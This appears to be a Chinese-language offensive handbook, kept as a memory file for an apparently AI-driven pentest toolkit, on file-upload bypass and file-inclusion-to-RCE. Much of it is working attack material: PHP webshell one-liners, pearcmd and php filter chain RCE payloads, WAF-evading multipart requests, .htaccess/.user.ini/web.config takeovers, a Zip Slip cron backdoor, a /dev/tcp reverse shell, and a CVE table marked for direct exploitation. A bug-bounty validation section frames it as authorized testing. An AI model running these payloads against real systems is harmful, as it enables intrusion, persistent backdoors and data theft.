---
name: kb_file_upload_lfi_deep_2026
description: 文件上传/文件包含深度实战手册(2026)—发现→验证→利用→取证全流程,上传绕过层级模型,2025-2026新CVE(iCagenda/NinjaForms/RSFiles/CRS/Pterodactyl/CraftCMS),peclcmd影子入口,php filter chain,上传+包含联合利用链,判定门槛
metadata:
  node_type: memory
  type: reference
  originSessionId: a19fc033-fadf-41cc-9f49-64d18f2471c4
---

# 文件上传 / 文件包含深度实战手册 (2026)

> 定位: 比 `kb_file_upload_bypass_2026.md`(绕过大全) 与 `kb_lfi_rfi_2026.md`(伪协议大全) **更深一层**——补全「发现→验证→利用→取证」闭环、上传绕过层级决策模型、2025-2026 新 CVE 实战、上传+包含联合链、WAF/CRS 绕过、判定门槛。
> 关系: 两专册=工具库, 本册=作战方法论。三者配合使用。

---

## 0. 两个漏洞的辩证关系（先建立世界观）

| 维度 | 文件上传 | 文件包含(LFI/RFI) |
|------|---------|------------------|
| 本质 | 把**内容**写入目标 | 把**路径**交给解释器 |
| 直接危害 | 写到可执行目录=直RCE | 读文件/配合投毒=RCE |
| 单独用 | 需 web 根可写+可执行 | 需可控文件内容 |
| **联合用** | 图片马+伪协议(phar/zip/data) = LFI 触发 | 上传点喂 phar/zip → 反序列化/包含 |

**核心思维**: 现实中两者常互补——上传点能落文件但目录不可执行 → 转给 LFI 用 `phar://`/`zip://` 触发; LFI 有包含点但无可控文件 → 用日志/session/pearcmd 投毒。**发现任一个, 都要立刻脑补另一个的组合链。**

---

## 1. 发现阶段（主动探测, 不被动等）

### 1.1 上传点枚举（A→E 低成本扫）
```
# 功能点关键词（浏览器 + dirsearch 双线）
/upload /uploads /avatar /attachment /file /files /import /media /image
/ueditor /ckeditor /ckfinder /kindeditor /fckeditor /elfinder /ewebeditor
# 常见路径直测（curl 批量, 不开浏览器）
ffuf -w upload_paths.txt -u https://target/FUZZ -mc 200,301,302,403
```

### 1.2 上传后处理方式判定（决定绕过路线）
```
Step 1: 传正常图片 → 返回完整 URL?          → 直接访问 webshell
Step 2: 返回 ID?                            → 爆破/遍历拼接路径
Step 3: 重命名/二次渲染?                     → 条件竞争/二次渲染绕过
Step 4: 转 OSS/云存储?                       → 转向存储桶策略/SSRF
Step 5: 检查内容(弹"格式错误")?              → 图片马/幻数绕过
Step 6: 校验后删除?                          → 条件竞争
```

### 1.3 文件包含参数识别
```
# 特征参数名（命中即测 LFI）
file / page / path / include / require / template / view / module / lang
dir / doc / load / read / data / detail / download / image_url / theme
# 快速验证: 传 ../../../../etc/passwd → 看是否回显 root:x:
#  有回显=LFI 直接可读  无回显=盲 LFI(走 OOB/错误型)
```

### 1.4 前置指纹（决定利用面）
```
确定: PHP / JSP / ASP.NET / 容器(fpm/apache/iis/nginx) / 有无 allow_url_include
  → 有 PHP+nginx/fpm  → .user.ini 路线
  → 有 Apache          → .htaccess 路线
  → 有 IIS             → web.config / 分号截断路线
  → 能控制文件内容     → 日志/session/pearcmd 投毒
```

---

## 2. 文件上传绕过：层级决策模型（2026 版）

> 现有 `kb_file_upload_bypass_2026.md` 列了 14 类绕过。这里给**作战顺序**: 每层测 1-2 个最高性价比 payload, 不逐项死磕。**命中即停, 未命中降层。**

```
黑名单绕过 → 白名单绕过 → 内容校验绕过 → 解析漏洞 → 逻辑缺陷 → 联合利用
```

### 2.1 黑名单绕过（看拦截回显判断是黑/白名单）
```
# 黑名单特征: 传 .php 弹"不允许此类型"但 .jpg 正常
shell.php3/php4/php5/php7/pht/phtml/phar/.shtml     # 备用后缀
shell.PHP / .pHp / .PhP                                # 大小写
shell.php. / shell.php%20 / shell.php%0a              # 尾缀
shell.php::$DATA                                      # NTFS (Windows)
shell.php%00.jpg                                      # 截断 (<PHP5.3.4)
shell.php.jpg / shell.jpg.php                         # 双扩展(取决于解析)
shell.php7                                            # 新 PHP 后缀
```

### 2.2 白名单绕过（只允许 image/jpeg 等）
```
# 白名单特征: 传 .jpg 通过, 其它一律拒
Content-Type: image/jpeg    # MIME 伪造
GIF89a 头 + <?php ...?>     # 幻数伪造(图片马)
SVG 特例: 白名单常放行 image/svg+xml → 内嵌 JS → 存储型 XSS
   <?xml version="1.0"?>
   <svg xmlns="http://www.w3.org/2000/svg">
     <script>alert(document.domain)</script>
   </svg>
```

### 2.3 内容校验绕过（getimagesize/二次渲染）
```
# 只检测文件头(幻数): 拼接即过
copy /b real.jpg + shell.php shell.jpg
exiftool -Comment='<?php system($_GET["cmd"]);?>' real.jpg -o shell.jpg

# 完整二次渲染: GIF 最稳(数据区不改写), 用 010 Editor 在数据区插码
# JPG/PNG 二次渲染需专用工具(IDAT 改写/PHP 脚本)

# 2024-2026 新 polyglot: 触发解析器而非仅图片
#   CVE-2024-29510 Ghostscript ≤10.03: EPS-in-JPG polyglot → ImageMagick/Ghostscript
#   处理图片的服务端转换管线会执行 EPS 内嵌 PostScript → RCE
```

### 2.4 服务器解析漏洞（版本指纹驱动）
```
Nginx + PHP (cgi.fix_pathinfo=1):
   /upload/shell.jpg/1.php    → .jpg 被当 PHP 执行
IIS 6.0:   /upload/1.asp;.jpg → 分号截断;  /1.asp/1.jpg → 目录名解析
IIS 7.x:   /upload/shell.jpg/.php  → FastCGI 解析
Apache:    shell.php.xxx 从右往左匹配已知扩展名
Tomcat:    .jsp/.jspx/.jspf  + WAR 直接部署
```

### 2.5 逻辑缺陷（2025-2026 实战高发, 别只盯后缀）
```
# A. 分离控制器/分叉逻辑: 预检与写入分离, 直调写入端点绕过预检
#    RSFiles! CVE-2026-57827: 直 POST task=rsfiles.upload 绕过 checkupload 预检
#    → 无权限校验/无扩展名校验/无 CSRF → JFile::upload 任意类型

# B. 校验源文件名不校验目标文件名
#    Ninja Forms CVE-2026-0740: handle_upload 校验源, move 时用未净化目标名
#    → PDF 头伪装 .php 落盘 + 路径穿越直接进 webroot

# C. 重定向后不 exit()/die()
#    Xerte CVE-2026-34413: elFinder connector 重定向后继续处理 → 未授权上传

# D. 仅视图层鉴权, 控制器无鉴权
#    iCagenda CVE-2026-48939 (CVSS 10): 事件提交表单附件无扩展名校验, 直 POST 端点
#    → PHP shell 写 images/icagenda/frontend/attachments/ → 预认证 RCE
```

### 2.6 配置文件接管（终极绕过）
```
# .htaccess (Apache + AllowOverride Options/FileInfo)
AddType application/x-httpd-php .jpg          # 任意后缀按 PHP 执行
SetHandler application/x-httpd-php             # 目录全执行
# 之后传 shell.jpg → 即 webshell

# .user.ini (PHP-FPM, 目录级, 300 秒生效)
auto_prepend_file = shell.jpg                  # 每次 PHP 请求先包含
# 之后传 shell.jpg 到同目录 → 访问该目录任意 .php 即触发

# web.config (IIS)
<system.webServer><handlers>
<add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"/>
</handlers></system.webServer>
# 之后传 .jpg 当 ASP.NET 执行

# 2026 新变体: 空格填充绕过扩展名检查 (CVE-2026-33691, OWASP CRS)
#   filename="shell.php  "  → CRS 正则没归一化尾随空格 → 放行
#   后端 trim 后按 .php 执行 (Windows 后端最实用)
```

### 2.7 条件竞争（校验后删除的时间窗）
```
# 服务端: 落盘→校验→删除, 用并发抢在删除前执行
# Turbo Intruder: 多线程 POST shell.php + 多线程 GET /upload/shell.php
# 命中特征: GET 偶发返回 200 + 命令回显
```

### 2.8 WAF 绕过纵深（2025 前沿: 解析器差异, 不是暴力 fuzz）

> 核心原理: **WAF 用标准化严格解析器, 后端用自家库**——构造"WAF 看着无害、后端看是恶意"的请求。这是 2025 最高价值方向, 胜过堆后缀。

```
# A. filename= 与 filename*= 双参数解析差异 (最前沿, 已过 Codegate 2024)
#    后端(PHP/Java)取 filename, WAF 取 filename*
--BOUNDARY
Content-Disposition: form-data; name="file"; filename=shell.php; filename*=UTF-8''shell.jpg
Content-Type: text/plain
<?php system($_GET['c']);?>
--BOUNDARY--
#   → WAF 看到 shell.jpg(放行), PHP $_FILES 看到 shell.php(执行)

# B. multipart 结构走私 (WAFFLED, IEEE S&P 2025 论文)
#    用 preamble/epilogue + 嵌套 envelope 重组请求体
#    WAF 与源站解析 multipart 结构不同 → payload 藏在"一方跳过、另一方处理"的区域
#    工具: wafrift-content-type (Rust crate) 自动扫 Content-Type 变体

# C. 多文件上传浅检查 (高发)
#    file1=真jpg(深检放行) + file2=shell.php::$DATA(浅检漏) → 可删第二个 Content-Type

# D. 垃圾填充超扫描窗口
#    WAF 常只扫文件前 ~8KB → payload 前垫 10KB+ 随机垃圾

# E. 编码/大小写混合 (WAF 不归一化)
#    shell.%70hp  (URL编码)   shell.php (Unicode)   <?PHP (标签大小写)
#    shell.p\nhp  (文件名内插换行破正则)

# F. 云 WAF 专属
#    双 URL 编码路径: %252e%252e%252f → CF 解码一次, 后端解码两次 (200)
#    可信头伪造: X-Forwarded-For: 127.0.0.1 → CF 视为本机跳过全部过滤
#    Content-Type 切换(WAFFLED): form→json→multipart→xml 直到发现解析分歧

# G. 分块传输
#    Transfer-Encoding: chunked 时部分 WAF 不解析文件体, PHP 拆块执行
```

### 2.9 云存储上传面（OSS/S3/MinIO——2025 高发, 别只盯本地目录）

```
# 场景: 上传被转发到云对象存储, "落盘可执行"失效 → 转向存储配置缺陷

# A. 桶策略/ACL 配置缺陷 → 任意读写/泄露
#    发现: 响应头 x-amz-* / 域名 assets.cdn.com / *.s3*.amazonaws.com / *.aliyuncs.com
#    测试: 直接 GET 桶根看是否列目录(ListObjects 公开)
#    工具: S3Scanner / BucketLoot / Slurp / GrayhatWarfare 索引

# B. Content-Type override → 存储型 XSS (绕过所有上传校验!)
#    MinIO/S3 可用查询参数覆盖响应 Content-Type (官方特性, 非 bug)
#    GET /uploads/x.html?response-content-type=text/html
#    若文件从目标自身源(同源)served → 浏览器按 HTML 渲染 → 存储型 XSS
#    实战: HITCON ZD-2025-01563 Funliday S3 任意上传 contentType=text/html → XSS

# C. 任意文件托管 + 恶意文件分发 (数据面)
#    上传 HTML/JS → 借用可信域托管钓鱼/恶意脚本
```

### 2.10 Tomcat 特化: JSP/WAR 上传（Java 系别漏）
```
# CVE-2024-50379: Tomcat 上传 JSP shell → RCE
#   前置: /uploads 目录无保护/可写, 应用上传功能弱校验
#   打: 上传 shell.jsp → http://target/uploads/shell.jsp 直接命令交互
#   (CVE-2025-24813 是"Partial PUT+穿越+会话反序列化"另一条, 见 RCE 手册)

# WAR 部署: 若有 Tomcat Manager 弱口令(admin/admin)
#   上传恶意 WAR → 自动解压到 webapps → RCE
#   路径: /manager/html PUT .war / text/html
```

---

## 3. 文件包含 → RCE：纵深路线（2026 增量）

> 现有 `kb_lfi_rfi_2026.md` 已覆盖伪协议大全/日志/session/pearcmd/proc/FD/目录穿越。这里补 **2025-2026 新打法** 与实战链。

### 3.1 php filter chain（无文件写入的终极 RCE）
```
# 原理: 一串 iconv+base64 filter 拼出任意 PHP 代码, include 时执行
# 无需上传/日志/session——只要 LFI 存在即可
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|.../resource=index.php&cmd=id

# 工具(标准): synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
# 框架: LFIbay (53+ 预置链, 一键打)

# 实战: CVE-2025-49132 (Pterodactyl Panel ≤1.11.10, CVSS 9.8)
#   未认证 LFI → filter chain RCE / pearcmd RCE / 反序列化 三选一
```

### 3.2 pearcmd.php 深度利用 + 影子入口 peclcmd.php（2025 新）
```
# 触发条件: register_argc_argv=On (PHP 默认) + PEAR 存在
#    query string 被当作 argv, + 号=空格分隔参数

# 基础写 shell (root_path 内嵌短标签):
?file=../../../../usr/share/php/pearcmd.php&+config-create+/<?=system($_GET[1]);?>+/tmp/shell.php

# 2025 实战改良:
#   A. hex2bin 编码命令 → 避开 + = & 空格 (反连也能打)
#      system(hex2bin('636174...'))   # hex 仅 0-9a-f
#   B. 动态探测 PEAR 路径 (不硬编码 /usr/share/php)
#   C. curl -g 交付, 防 requests 把 <>{} 静默编码
#   D. ${IFS} 代替空格绕过 URL 解析
#   E. **peclcmd.php 影子入口**: 与 pearcmd 同功能但常不在 WAF 黑名单
#      → pearcmd/filter/data/http/file/日志全被拦时, peclcmd 直接穿
```

### 3.3 /proc/self/environ 与 FD（无日志路径时的投毒）
```
# UA 注入 PHP, 包含 environ
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']);?>
?file=../../../proc/self/environ&cmd=id

# environ 不可读 → 日志包含(apache/nginx access.log)
#   → 仍不可读 → /proc/self/fd/1 /proc/self/fd/2 (盲猜 FD)
```

### 3.4 Session 投毒（2025 实战化）
```
# CraftCMS CVE-2025-32432: 可控 SessionId cookie 写入 PHP payload
#   → LFI include /var/lib/php/sessions/sess_<id> → 反弹 shell
# 通用: 登录/资料页可控字段注入 <?php system(...);?> → 包含 sess_xxx
```

### 3.5 目录穿越 vs 文件包含（区分打法）
```
# 目录穿越(任意文件读): 走绝对路径/穿越, 重点读配置/源码/密钥
# 文件包含(代码执行): 走伪协议/投毒, 重点触发执行
# 判别: ?file=../../../etc/passwd 回显 root:x → 至少可读 → 升级读关键文件
#   /etc/nginx/nginx.conf / WEB-INF/web.xml / config.php / .env / id_rsa
# 高价值读法: php://filter/convert.base64-encode/resource=index.php (源码)
```

### 3.6 LFI → RCE 决策树（2026 版, 优先级排序）
```
1. allow_url_include=On?        → php://input / data:// / RFI(http://)
2. 有 php://filter 可用?        → filter chain 直接 RCE (无需文件)
3. 能控制服务器文件内容?        → 日志/UA 投毒 → environ/FD/日志包含
4. 有上传点?                    → phar:// 反序列化 / zip:// 包含 / 图片马+LFI
5. 有 pearcmd/peclcmd?          → +config-create 写 shell (优先 peclcmd 绕 WAF)
6. 全部失败?                    → 至少读源码配置 → 转挖其它链
```

---

## 4. 上传 + 包含 联合利用链（双漏洞组合, 价值翻倍）

```
# 链 A: 上传图片马 + LFI 触发 (上传目录不可执行时)
上传 shell.jpg (GIF89a+PHP) → ?file=uploads/shell.jpg → include 执行

# 链 B: 上传 phar + 任意包含点触发反序列化 (phar.readonly=Off)
构造 phar:// 反序列化 payload → 后缀伪装 .jpg 上传 → ?file=phar://uploads/x.jpg

# 链 C: 上传 zip + zip:// 包含
?file=zip://uploads/shell.zip%23shell

# 链 D: 上传 .htaccess/.user.ini + 图片马 → 目录变可执行 (§2.6)

# 链 E: 任意文件写(非上传点, 如 XML 解析/解压漏洞) + 定时任务
Zip Slip → 写 /etc/cron.d/backdoor → 定时 RCE
```

---

## 5. 验证与取证（判定门槛前必做）

```
# 无害验证(优先): 上传 test.txt 内容探针 → 直接访问确认可执行目录
#   test.txt 内容: <?php echo "VULN".md5(1);?>
#   访问返回 VULN+c4ca4238a0b923820dcc509a6f75849b = 确认执行

# 确认 RCE 最小化: 先 id/whoami/echo 回显, 不先反连
# 取证三件套:
#   1. 命令回显截图/请求包(浏览器+Burp 留包)
#   2. webshell 访问 URL + GSL5 连接成功
#   3. dnslog 回连 IP=目标出口 IP (无回显场景)
#   反连: bash -i >& /dev/tcp/<攻击机>/4444 (srv.py listen)
```

---

## 6. 判定门槛（SRC 四门槛, 防止误报）

满足全部才定性"文件上传/包含 RCE 漏洞":
1. **可复现**: 同 payload 稳定再触发
2. **有利用链**: 能落盘可执行内容 / 能触发包含执行 (非仅存储)
3. **有明确影响**: 命令执行/读敏感文件/写入可执行目录
4. **有实证**: 请求+响应+回显/回连

**默认不构成漏洞**:
```
- 仅"能上传文件到非执行目录" → 不构成 RCE (除非能 phar/zip 或改配置)
- 仅 LFI 读自身源码 → 信息泄露级, 非 RCE (除非读到敏感凭据)
- 图片马上传成功但永远不可执行 → 不构成
- 存储型 XSS via SVG(无可分享/无管理后台访问) → 视场景降级
```

---

## 7. 工具链与衔接

```
上传绕过清单: kb_file_upload_bypass_2026.md
LFI/RFI 伪协议大全: kb_lfi_rfi_2026.md
SSTI/上传 Getshell: rce_getshell/ssti_upload_getshell.md
PHP webshell: rce_getshell/php_webshell_rce.md
任意写→RCE 专项: .claude/skills/arbitrary-write-to-rce/
上传绕过 skill: .claude/skills/upload-insecure-files/
LFI/穿越 skill: .claude/skills/path-traversal-lfi/
文件访问漏洞: .claude/skills/file-access-vuln/
filter chain: python3 php_filter_chain_generator.py / LFIbay
竞争: Burp Turbo Intruder
WebShell 管理: GSL5 (gsl5.jar mcp 9123)
dnslog 取证: dnslog_helper/dnslog.py
POC 检索: srcwiki_poc/Web应用漏洞/ + CMS漏洞/
```

---

## 8. 2025-2026 新 CVE 速查（指纹命中直接打）

| CVE | 产品 | 类型 | 打法 |
|-----|------|------|------|
| CVE-2026-48939 | iCagenda (Joomla) ≤4.0.7 | 预认证任意上传 | 直 POST 表单端点 → shell 到 attachments/ (CVSS10) |
| CVE-2026-0740 | Ninja Forms (WP) ≤3.3.26 | 预认证上传+穿越 | PDF 头伪装 .php / GIF89a / %2ehtaccess (9.8) |
| CVE-2026-57827 | RSFiles! (Joomla) <1.17.12 | 分叉控制器绕过 | 直调 task=rsfiles.upload (9.8) |
| CVE-2026-33691 | OWASP CRS <3.3.9/4.25 | WAF 绕过 | 扩展名尾随空格 padding → 链 CVE-2015-10138 |
| CVE-2026-34413 | Xerte ≤3.15 | elFinder 未授权 | 重定向不 exit() → 任意文件操作 |
| CVE-2025-69906 | Monstra CMS ≤3.0.4 | 黑名单绕过 | .PHP/.php7/.phtml |
| CVE-2025-49132 | Pterodactyl ≤1.11.10 | 未认证 LFI→RCE | filter chain / pearcmd / deser (9.8) |
| CVE-2025-32432 | CraftCMS | Session 投毒 LFI | CraftSessionId → 包含 sess_xxx → 反连 |
| CVE-2024-50379 | Apache Tomcat | JSP 上传 RCE | /uploads 弱校验 → shell.jsp 直命令 |
| CVE-2024-29510 | Ghostscript ≤10.03 | EPS polyglot | 图片转换管线触发 RCE |

---

## 9. Sources（2024-2026 时效性）

- [File Upload to RCE: Polyglot Files, MIME Bypass, SVG XSS and ImageMagick Exploits](https://lazyhackers.in/article/file-upload-rce-polyglot-imagetragick-svg-xss)
- [File Upload Vulnerabilities — Deep Dive](https://lazyhackers.in/article/file-upload-deep-dive)
- [File upload tricks and checklist (OnSecurity)](https://onsecurity.io/article/file-upload-checklist/)
- [Grav CMS avatar upload arbitrary storage (GHSA-xc64-vh46-vph6)](https://github.com/getgrav/grav/security/advisories/GHSA-xc64-vh46-vph6)
- [PortSwigger File Upload Mastery walkthroughs](https://github.com/Sam33r-Shahzad/File-Upload-Portswigger-Mastery)
- [iCagenda CVE-2026-48939 unauth upload RCE](https://www.ionix.io/threat-center/cve-2026-48939/)
- [Ninja Forms File Upload RCE CVE-2026-0740](https://securityonline.info/ninja-forms-file-upload-rce-vulnerability-cve-2026-0740/)
- [RSFiles! CVE-2026-57827 unauth RCE](https://github.com/Candisexterior171/CVE-2026-57827)
- [OWASP CRS whitespace padding bypass CVE-2026-33691](https://www.openwall.com/lists/oss-security/2026/04/16/12)
- [Xerte unauth file ops CVE-2026-34413](https://www.yazoul.net/advisory/cve/cve-2026-34413-xerte-online-toolkits-unauth-file-ops/)
- [Monstra CMS CVE-2025-69906 arbitrary upload RCE](https://github.com/cypherdavy/CVE-2025-69906-Monstra-CMS-3.0.4-Arbitrary-File-Upload-to-RCE)
- [Pterodactyl CVE-2025-49132 unauth LFI to RCE PoC](https://github.com/YoyoChaud/CVE-2025-49132)
- [HTB Pterodactyl writeup: LFI→pearcmd→privesc](https://github.com/V0idW1re/htb-pterodactyl-writeup)
- [当WAF拦截pearcmd.php: PECL临时文件包含绕过](https://blog.51cto.com/u_15288375/14737293)
- [CraftCMS CVE-2025-32432 RCE PoC](https://github.com/EzraMansor/CVE-2025-32432-PoC)
- [LFIbay: filter chain payload framework](https://github.com/SpaceLeam/LFIbay)
- [Path Traversal and LFI: From File Read to RCE](https://payloadplayground.com/blog/path-traversal-exploitation)
- [文件上传利用后端与 WAF 解析差异性实现绕过](https://www.cnblogs.com/Zephyr07/articles/19310795)
- [实战分享: 5种方法绕过宝塔WAF文件上传限制](https://blog.csdn.net/weixin_29325515/article/details/159600767)
- [WAFFLED: multipart smuggling (IEEE S&P 2025) / wafrift-content-type](https://docs.rs/wafrift-content-type/latest/wafrift_content_type/)
- [Content-Type Override to Stored XSS on Public Objects (S3/MinIO)](https://blog.voorivex.team/content-type-override-to-stored-xss-on-public-objects)
- [Funliday S3 arbitrary upload → XSS (HITCON ZD-2025-01563)](https://zeroday.hitcon.org/vulnerability/ZD-2025-01563)
- [CVE-2024-50379 Apache Tomcat JSP upload RCE PoC](https://github.com/pwnosec/CVE-2024-50379)

---

> 相关: [上传绕过大全](kb_file_upload_bypass_2026.md) | [LFI/RFI 大全](kb_lfi_rfi_2026.md) | [RCE 全攻击面](../rce_getshell/kb_rce_all_attack_surface_2026.md) | [技术手册索引](./_index.md)
